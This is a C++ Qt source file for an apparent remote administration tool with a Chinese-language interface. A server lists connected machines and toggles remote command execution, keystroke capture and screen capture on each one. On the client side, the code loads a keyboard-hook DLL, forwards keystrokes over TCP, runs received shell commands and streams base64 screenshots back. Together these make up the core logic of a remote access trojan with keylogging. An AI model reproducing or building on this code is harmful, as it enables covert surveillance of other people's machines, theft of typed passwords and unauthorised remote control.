#include "mainwindow.h"
#include "ui_mainwindow.h"

#include<QDebug>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    keyBoardMnt = NULL;
    cmdMnt = NULL;
    capturerMnt = NULL;
    cmdThread = NULL;
    capturerThread = NULL;
}

MainWindow::~MainWindow()
{
    netClient->close();
    delete ui;
}

bool MainWindow::nativeEvent(const QByteArray &eventType, void *message, long *result)
{
    MSG* msg = (MSG*) message;
    if(msg->message == WM_COPYDATA){
        COPYDATASTRUCT * p = reinterpret_cast<COPYDATASTRUCT*>(msg->lParam);
        netClient->send(common::packetType::keyHook, static_cast<char *>(p->lpData));
    }
    return QMainWindow::nativeEvent(eventType, message, result);
}

void MainWindow::on_CMDButton_clicked()
{
    QList<QListWidgetItem*> itemList = ui->listWidget->selectedItems();
    QListWidgetItem* item = nullptr;
    if(itemList.length() == 1)item = (ui->listWidget->selectedItems())[0];
    else {
        ui->statusbar->showMessage("未选中或选中多个已连接Socket");
        return;
    }
    int index = ui->listWidget->row(item);
    if(ui->CMDButton->text() == "CMD控制"){
        char data[256] = "on";
        netServer->send(index, common::packetType::cmd, data);
        if(cmdMnt == NULL){
            cmdMnt = new CMDMnt();
            cmdMnt->setIndex(index);
            connect(cmdMnt, &CMDMnt::exctCMD, this, &MainWindow::on_exctCMD);
        }
        cmdMnt->show();
        ui->CMDButton->setText("关闭");
    }else if(ui->CMDButton->text() == "关闭"){
        char data[256] = "off";
        netServer->send(index, common::packetType::cmd, data);
        ui->CMDButton->setText("CMD控制");
    }
}

void MainWindow::on_hookButton_clicked()
{
    QList<QListWidgetItem*> itemList = ui->listWidget->selectedItems();
    QListWidgetItem* item = nullptr;
    if(itemList.length() == 1)item = (ui->listWidget->selectedItems())[0];
    else {
        ui->statusbar->showMessage("未选中或选中多个已连接Socket");
        return;
    }
    int index = ui->listWidget->row(item);
    if(ui->hookButton->text() == "键盘监控"){
        char data[256] = "on";
        netServer->send(index, common::packetType::keyHook, data);
        if(keyBoardMnt == NULL)keyBoardMnt = new KeyBoardMnt();
        keyBoardMnt->show();
        ui->hookButton->setText("关闭");
    }else if(ui->hookButton->text() == "关闭"){
        char data[256] = "off";
        netServer->send(index, common::packetType::keyHook, data);
        ui->hookButton->setText("键盘监控");
    }

}

void MainWindow::on_startServer_clicked()
{
    int port = ui->serverPort->text().toInt();
    int maxClient = ui->serverMaxClient->text().toInt();
    this->netServer = new NetServer(port, maxClient);
    //TODO 判断是否出现问题
    connect(netServer, &NetServer::newClient, this, &MainWindow::on_newClient);
    connect(netServer, &NetServer::disClient, this, &MainWindow::on_disClient);
    connect(netServer, &NetServer::readData, this, &MainWindow::dispatchServerData);
    ui->statusbar->showMessage("服务端：启动成功");
    ui->serverPort->setEnabled(false);
    ui->serverInterval->setEnabled(false);
    ui->serverMaxClient->setEnabled(false);
    ui->startServer->setEnabled(false);
}

void MainWindow::on_newClient(QTcpSocket *socket)
{
    QString ip = socket->peerAddress().toString();
    ui->listWidget->addItem(ip);
    ui->statusbar->showMessage("服务端："+ip+"连接");
}

void MainWindow::on_disClient(int index)
{
    QListWidgetItem *item = ui->listWidget->takeItem(index);
    QString ip = item->text();
    delete item;
    ui->statusbar->showMessage("服务端："+ip+"断开");
}

void MainWindow::on_clientConnect_clicked()
{
    if(ui->clientConnect->text() == "连接"){
        QString ip = ui->connectIP->text();
        int port = ui->connectPort->text().toInt();
        netClient = new NetClient(ip, port);
        //TODO 连接失败
        connect(netClient, &NetClient::readData, this, &MainWindow::dispatchClientData);
        ui->clientConnect->setText("断开");
    }else if(ui->clientConnect->text() == "断开"){
        netClient->close();
        ui->clientConnect->setText("连接");
    }
}

void MainWindow::on_exctCMD(char *data)
{
    CMDMnt* mnt = (CMDMnt*) sender();
    int index = mnt->getIndex();
    netServer->send(index, common::packetType::cmd, data);
}

void MainWindow::on_client_send_data(int type, QByteArray data)
{
    char* data2;
    switch (type) {
    case common::packetType::cmd:
        data2 = new char[data.length()];
        memcpy(data2, data, data.length());
        netClient->send((common::packetType)type, data2);
        break;
    case common::packetType::capture:
        data = data.toBase64();
        data2 = new char[data.length()];
        memcpy(data2, data, data.length());
        netClient->send((common::packetType)type, data2);
        break;
    }
}

void MainWindow::dispatchClientData(common::packetType type, char* data)
{
    switch (type) {
    case common::packetType::cmd:
        if(QString(data) == "on")client_CMD(true);
        else if(QString(data) == "off")client_CMD(false);
        else cmdThread->exctCMD(data);
        break;
    case common::packetType::keyHook:
        if(QString(data) == "on")client_KeyHook(true);
        else if(QString(data) == "off")client_KeyHook(false);
        break;
    case common::packetType::capture:
        if(QString(data) == "on")client_Capture(true);
        else if(QString(data) == "off")client_Capture(false);
        break;
    }
}

void MainWindow::dispatchServerData(common::packetType type, int index, char* data)
{
    switch (type) {
    case common::packetType::cmd:
        cmdMnt->appentText(data);
        break;
    case common::packetType::keyHook:
        keyBoardMnt->appentText(data);
        break;
    case common::packetType::capture:
        capturerMnt->refresh(data);
        break;
    case common::packetType::other:
        if(!QString(data).compare("beat"))netServer->beat(index);
        break;
    }
}

void MainWindow::client_CMD(bool on_off)
{
    if(on_off){
        if(cmdThread == NULL){
            cmdThread = new CMDThread();
            connect(cmdThread, &CMDThread::client_send_data, this, &MainWindow::on_client_send_data);
        }
        else cmdThread->startThread();
    }else{
        cmdThread->closeThread();
    }
}

void MainWindow::client_KeyHook(bool on_off)
{
    if(on_off){
        typedef bool (*FUNC)(HWND hWnd);
        hookLib = new QLibrary(common::HOOKDLLPATH);
        hookLib->load();
        FUNC func = (FUNC)hookLib->resolve("SetHook");
        if(func != NULL){
            func((HWND)this->winId());
        }
    }else{
        typedef bool (*FUNC)();
        FUNC func = (FUNC)hookLib->resolve("UnHook");
        func();
        hookLib->unload();
    }
}

void MainWindow::client_Capture(bool on_off)
{
    if(on_off){
        if(capturerThread == NULL){
            capturerThread = new CapturerThread();
            connect(capturerThread, &CapturerThread::client_send_data, this, &MainWindow::on_client_send_data);
        }
        else capturerThread->startThread();
    }else{
        capturerThread->closeThread();
    }
}

void MainWindow::on_capturerButton_clicked()
{
    QList<QListWidgetItem*> itemList = ui->listWidget->selectedItems();
    QListWidgetItem* item = nullptr;
    if(itemList.length() == 1)item = (ui->listWidget->selectedItems())[0];
    else {
        ui->statusbar->showMessage("未选中或选中多个已连接Socket");
        return;
    }
    int index = ui->listWidget->row(item);
    if(ui->capturerButton->text() == "屏幕监控"){
        char data[256] = "on";
        netServer->send(index, common::packetType::capture, data);
        if(capturerMnt == NULL)capturerMnt = new CapturerMnt();
        capturerMnt->show();
        ui->capturerButton->setText("关闭");
    }else if(ui->capturerButton->text() == "关闭"){
        char data[256] = "off";
        netServer->send(index, common::packetType::capture, data);
        ui->capturerButton->setText("屏幕监控");
    }
}
